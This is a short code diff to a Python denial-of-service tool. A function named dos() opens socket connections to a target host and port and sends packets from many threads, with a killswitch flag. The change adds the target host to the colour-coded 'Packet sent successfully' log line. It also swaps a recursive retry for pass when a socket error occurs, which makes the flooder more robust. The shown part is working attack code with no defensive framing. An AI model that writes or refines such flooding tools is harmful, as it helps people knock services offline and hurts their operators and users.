@@ -112,12 +112,12 @@ def dos():
                     s.connect((host, int(port)))
                     if s.sendto(packet, (host, int(port))):
                         s.shutdown(socket.SHUT_WR)
-                        print(f"\033[38;2;215;167;174mPacket sent successfully\033[0m Thread {item} \033[38;2;215;167;174mat\033[0m Port {port}{' ' * max(1, 47 - len(f'Packet sent successfully Thread {item} at Port {port}'))}\033[38;2;215;167;174m{time.ctime()}\033[0m")
+                        print(f"\033[38;2;215;167;174mPacket sent successfully\033[0m Thread {item} \033[38;2;215;167;174mat\033[0m Port {port} \033[38;2;215;167;174mon \033[0m{host}{' ' * max(1, 47 - len(f'Packet sent successfully Thread {item} at Port {port} on {host}'))}\033[38;2;215;167;174m{time.ctime()}\033[0m")
                     else:
                         print("\033[38;2;215;167;174m Connection closed unexpectedly\033[0m")
                     continue
             except socket.error:
-                dos()
+                pass
 
         def attack_thread():
             while not dos_killswitch:
